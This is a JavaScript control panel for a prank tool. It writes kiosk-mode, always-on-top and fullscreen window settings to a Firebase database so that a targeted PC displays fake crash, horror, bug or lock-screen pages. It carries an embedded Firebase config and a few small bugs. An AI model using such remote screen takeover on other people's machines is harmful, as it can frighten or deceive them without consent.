import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {
  getDatabase,
  ref,
  update,
  get,
  query,
  orderByChild,
  equalTo,
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyApYe89iqLFy3uYR1PWyBvYCBI-63AI6mc",
  authDomain: "faketool.firebaseapp.com",
  projectId: "faketool",
  storageBucket: "faketool.appspot.com",
  messagingSenderId: "225004660244",
  appId: "1:225004660244:web:8c0682c40eb29b49e1e901",
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Ambil elemen dari DOM
const addressInput = document.getElementById("address");
const screenSelect = document.getElementById("screen");
const urlInput = document.getElementById("url");

const fullscreenCheckbox = document.getElementById("fullscreen");
const maximizeCheckbox = document.getElementById("maximize");
const transparentCheckbox = document.getElementById("transparent");

const resizableCheckbox = document.getElementById("resizable");
const minimizableCheckbox = document.getElementById("minimizable");
const maximizableCheckbox = document.getElementById("maximizable");
const skipTaskbarCheckbox = document.getElementById("skipTaskbar");
const alwaysOnTopCheckbox = document.getElementById("alwaysOnTop");
const frameCheckbox = document.getElementById("frame");
const kioskCheckbox = document.getElementById("kiosk");

const titleBarStyleSelect = document.getElementById("titleBarStyle");
const showDelayInput = document.getElementById("showDelay");
const autocloseInput = document.getElementById("autoclose");
const useBackroundColorCheckbox = document.getElementById("useBackroundColor");
const focusCheckbox = document.getElementById("focus");
const backgroundColorInput = document.getElementById("backgroundColor");

const leftInput = document.getElementById("left");
const topInput = document.getElementById("top");
const rightInput = document.getElementById("right");
const bottomInput = document.getElementById("bottom");
const widthInput = document.getElementById("width");
const heightInput = document.getElementById("height");
const titleInput = document.getElementById("title");

const customUrlWrapper = document.getElementById("custom-url-wrapper");
const form = document.getElementById("remote-form");
const btnDefault = document.getElementById("btn-default");

const masterUrl = {
  crash: "https://affanone.github.io/faketool/crash.html",
  crash2: "https://affanone.github.io/faketool/crash2.html",
  blank: "https://affanone.github.io/faketool/blank.html",
  horror: "https://affanone.github.io/faketool/horror.html",
  bug: "https://affanone.github.io/faketool/bug.html",
  lock: "https://affanone.github.io/faketool/lock.html",
  custom: "Custom",
};

let masterUrlConfigDefault = {
  crash: {
    url: masterUrl.crash,
    fullscreen: true,
    maximize: false,
    transparent: false,
    resizable: false,
    minimizable: false,
    maximizable: false,
    skipTaskbar: true,
    alwaysOnTop: true,
    frame: false,
    titleBarStyle: "hidden",
    kiosk: true,
    showDelay: 2000,
    autoclose: 0,
    backgroundColor: "#ffffff",
    left: null,
    top: null,
    width: null,
    height: null,
    focus: true,
    title: "Crash",
  },
  crash2: {
    url: masterUrl.blank,
    fullscreen: true,
    transparent: true,
    backgroundColor: "#ffffff",
    title: "Blank",
  },
  blank: {
    url: masterUrl.blank,
    fullscreen: true,
    transparent: true,
    backgroundColor: "#ffffff",
    title: "Blank",
  },
  horror: {
    url: masterUrl.horror,
    fullscreen: true,
    alwaysOnTop: true,
    kiosk: true,
    showDelay: 2000,
    title: "Horror",
  },
  bug: {
    url: masterUrl.bug,
    fullscreen: false,
    maximize: true,
    backgroundColor: "#eeeeee",
    title: "Bug Simulator",
  },
  lock: {
    url: masterUrl.lock,
    fullscreen: true,
    frame: false,
    kiosk: true,
    title: "Lock Screen",
  },
};

try {
  const raw = localStorage.getItem("configs");
  if (raw) {
    const cfg = JSON.parse(raw);
    for (let i of Object.keys(cfg)) {
      masterUrlConfigDefault[i] = cfg[i];
    }
  }
} catch (e) {
  console.warn("Data configs di localStorage tidak valid:", e);
}

btnDefault.addEventListener("click", () => {
  if (screenSelect.value === "crash") {
    const def = {
      url: masterUrl[screenSelect.value],
      titleBarStyle: "hidden",
      title: "x800000000001",
      left: null,
      top: null,
      tight: null,
      bottom: null,
      width: null,
      height: null,
      backgroundColor: null,
      showDelay: null,
      autoclose: null,
      fullscreen: true,
      maximize: false,
      transparent: true,
      resizable: false,
      minimizable: false,
      focus: true,
      maximizable: false,
      skipTaskbar: true,
      alwaysOnTop: true,
      frame: false,
      kiosk: true,
    };
    fillFormDefault(def);
  } else if (screenSelect.value === "crash2") {
    const def = {
      url: masterUrl[screenSelect.value],
      titleBarStyle: "hidden",
      title: "x800000000002",
      left: null,
      top: 0,
      tight: 0,
      bottom: null,
      width: 120,
      height: null,
      backgroundColor: null,
      showDelay: null,
      autoclose: null,
      fullscreen: false,
      maximize: false,
      transparent: true,
      resizable: false,
      minimizable: false,
      focus: true,
      maximizable: false,
      skipTaskbar: true,
      alwaysOnTop: true,
      frame: false,
      kiosk: true,
    };
    fillFormDefault(def);
  } else if (screenSelect.value === "crash2") {
    const def = {
      url: masterUrl[screenSelect.value],
      titleBarStyle: "hidden",
      title: "x800000000002",
      left: null,
      top: 0,
      tight: 0,
      bottom: null,
      width: 120,
      height: null,
      backgroundColor: null,
      showDelay: null,
      autoclose: null,
      fullscreen: false,
      maximize: false,
      transparent: true,
      resizable: false,
      minimizable: false,
      focus: true,
      maximizable: false,
      skipTaskbar: true,
      alwaysOnTop: true,
      frame: false,
      kiosk: true,
    };
    fillFormDefault(def);
  }
});

screenSelect.addEventListener("change", () => {
  customUrlWrapper.classList.toggle("d-none", screenSelect.value !== "custom");
});

useBackroundColorCheckbox.addEventListener("change", () => {
  backgroundColorInput.classList.toggle(
    "d-none",
    !useBackroundColorCheckbox.checked
  );
});

let autoReset = false;
form.addEventListener("reset", (e) => {
  if (autoReset) return;
  e.preventDefault();
  const address = addressInput.value.trim();
  if (!address) return alert("Harus mengisi alamat");

  openLoading("Reset...");
  fetchOnce("fake-pc", address, async (data) => {
    if (data) {
      const id = Object.keys(data)[0];
      await updateData(`fake-pc/${id}`, {
        url: "",
        fullscreen: false,
        maximize: false,
        transparent: false,
        autoclose: 0,
      });
      autoReset = true;
      resetForm();
      autoReset = false;
      closeLoading();
    } else {
      closeLoading();
      alert("PC tidak ditemukan");
    }
  });
});

form.addEventListener("submit", (e) => {
  e.preventDefault();
  const address = addressInput.value.trim();
  if (!address || !screenSelect.value)
    return alert("Isi alamat dan jenis fake");

  openLoading("Mengirim data...");
  fetchOnce("fake-pc", address, async (data) => {
    if (data) {
      const id = Object.keys(data)[0];
      const url =
        screenSelect.value !== "custom"
          ? masterUrl[screenSelect.value]
          : urlInput.value.trim();

      const updatePayload = {
        url,
        fullscreen: fullscreenCheckbox.checked,
        maximize: maximizeCheckbox.checked,
        transparent: transparentCheckbox.checked,
        resizable: resizableCheckbox.checked,
        minimizable: minimizableCheckbox.checked,
        maximizable: maximizableCheckbox.checked,
        skipTaskbar: skipTaskbarCheckbox.checked,
        alwaysOnTop: alwaysOnTopCheckbox.checked,
        frame: frameCheckbox.checked,
        kiosk: kioskCheckbox.checked,
        focus: focusCheckbox.checked,
        titleBarStyle: titleBarStyleSelect.value,
        showDelay: parseInt(showDelayInput.value || "0"),
        autoclose: parseInt(autocloseInput.value || "0"),
        backgroundColor: useBackroundColorCheckbox.checked
          ? backgroundColorInput.value ?? null
          : null,
        left: leftInput.value ? parseInt(leftInput.value) : null,
        top: topInput.value ? parseInt(topInput.value) : null,
        right: rightInput.value ? parseInt(rightInput.value) : null,
        bottom: bottomInput.value ? parseInt(bottomInput.value) : null,
        width: widthInput.value ? parseInt(widthInput.value) : null,
        height: heightInput.value ? parseInt(heightInput.value) : null,
        title: titleInput.value ?? "",
      };

      let conf;
      try {
        conf = JSON.parse(localStorage.getItem("configs")) ?? {};
      } catch (e) {
        conf = {};
      }
      conf[screenSelect.value] = updatePayload;
      localStorage.setItem("configs", JSON.stringify(conf));
      masterUrlConfigDefault[screenSelect.value] = updatePayload;

      await updateData(`fake-pc/${id}`, updatePayload);
      autoReset = true;
      resetForm();
      autoReset = false;
      closeLoading();
    } else {
      closeLoading();
      alert("PC tidak ditemukan");
    }
  });
});

screenSelect.addEventListener("change", () => {
  const selected = screenSelect.value;
  customUrlWrapper.classList.toggle("d-none", selected !== "custom");
  fillFormDefault(selected);
});

document.addEventListener("DOMContentLoaded", () => {
  fillFormDefault(screenSelect.value);
});

function fetchOnce(path, addressValue, callback) {
  const q = query(
    ref(database, path),
    orderByChild("address"),
    equalTo(addressValue)
  );
  get(q).then((snapshot) => {
    callback(snapshot.exists() ? snapshot.val() : null);
  });
}

async function updateData(pathWithId, data) {
  await update(ref(database, pathWithId), data);
}

function fillFormDefault(screenType) {
  const config =
    typeof screenType === "object"
      ? screenType
      : masterUrlConfigDefault[screenType] ?? {};
  const {
    url,
    fullscreen = true,
    maximize = false,
    transparent = false,
    resizable = false,
    minimizable = false,
    maximizable = false,
    skipTaskbar = true,
    alwaysOnTop = true,
    frame = false,
    focus = true,
    titleBarStyle = "hidden",
    kiosk = true,
    showDelay = 2000,
    autoclose = 0,
    backgroundColor = null,
    left,
    top,
    right,
    bottom,
    width,
    height,
    title = "",
  } = config;

  // Assign ke elemen form
  if (screenType !== "custom") {
    urlInput.value = url ?? "";
  }

  fullscreenCheckbox.checked = fullscreen;
  maximizeCheckbox.checked = maximize;
  transparentCheckbox.checked = transparent;

  resizableCheckbox.checked = resizable;
  minimizableCheckbox.checked = minimizable;
  maximizableCheckbox.checked = maximizable;

  skipTaskbarCheckbox.checked = skipTaskbar;
  alwaysOnTopCheckbox.checked = alwaysOnTop;
  focusCheckbox.checked = focus;
  frameCheckbox.checked = frame;
  kioskCheckbox.checked = kiosk;

  titleBarStyleSelect.value = titleBarStyle ?? "default";

  showDelayInput.value = showDelay ?? 0;
  autocloseInput.value = autoclose ?? 0;

  backgroundColorInput.value = backgroundColor ?? "#ffffff";
  if (backgroundColor === null) {
    useBackroundColorCheckbox.checked = false;
  } else {
    useBackroundColorCheckbox.checked = true;
  }

  leftInput.value = left ?? "";
  topInput.value = top ?? "";
  rightInput.value = right ?? "";
  bottomInput.value = bottom ?? "";
  widthInput.value = width ?? "";
  heightInput.value = height ?? "";

  titleInput.value = title;

  backgroundColorInput.classList.toggle(
    "d-none",
    !useBackroundColorCheckbox.checked
  );

  customUrlWrapper.classList.toggle("d-none", screenSelect.value !== "custom");
}

function openLoading(title = "Loading...") {
  Swal.fire({
    title,
    allowOutsideClick: false,
    didOpen: () => Swal.showLoading(),
  });
}

function closeLoading() {
  Swal.close();
}

function resetForm() {
  const old = screenSelect.value;
  const addr = addressInput.value;
  form.reset();
  screenSelect.value = old;
  addressInput.value = addr;
  fillFormDefault(screenSelect.value);
}
